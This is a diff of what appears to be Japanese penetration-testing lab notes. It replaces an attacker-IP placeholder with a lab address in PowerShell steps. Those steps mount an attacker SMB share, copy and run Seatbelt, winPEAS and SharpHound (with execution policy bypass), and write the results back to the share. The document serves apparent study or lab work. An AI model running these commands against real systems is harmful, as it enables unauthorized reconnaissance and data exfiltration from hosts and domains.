@@ -12,9 +12,9 @@ impacket-smbserver -smb2support -username username -password pw share share
 ```
 ```powershell
 # Target
-net use \\<AttackerIP>\share /user:username pw
-cp \\<AttackerIP>\share\Seatbelt.exe .
-.\Seatbelt.exe -group=all | Tee-Object -FilePath \\<AttackerIP>\share\seatbelt_result.txt
+net use \\192.168.49.104\share /user:username pw
+cp \\192.168.49.104\share\Seatbelt.exe .
+.\Seatbelt.exe -group=all | Tee-Object -FilePath \\192.168.49.104\share\seatbelt_result.txt
 ```
 
 ### 実行結果抽出
@@ -37,9 +37,9 @@ impacket-smbserver -smb2support -username username -password pw share share
 ```powershell
 # Target
 cd ~
-net use \\<AttackerIP>\share /user:username pw
-cp \\<AttackerIP>\share\winPEASx64.exe .
-.\winPEASx64.exe | Tee-Object -FilePath \\<AttackerIP>\share\peas_result.txt
+net use \\192.168.49.104\share /user:username pw
+cp \\192.168.49.104\share\winPEASx64.exe .
+.\winPEASx64.exe | Tee-Object -FilePath \\192.168.49.104\share\peas_result.txt
 ```
 
 ### 実行結果抽出
@@ -110,7 +110,7 @@ cp /opt/bloodhound/SharpHound.ps1 share
 ```powershell
 # Target
 powershell -ep bypass
-net use \\<AttackerIP>\share /user:username pw
-Import-Module \\<AttackerIP>\share\SharpHound.ps1
-Invoke-BloodHound -CollectionMethod All -OutputDirectory \\<AttackerIP>\share -ZipFileName 'audit.zip'
+net use \\192.168.49.104\share /user:username pw
+Import-Module \\192.168.49.104\share\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory \\192.168.49.104\share -ZipFileName 'audit.zip'
 ```
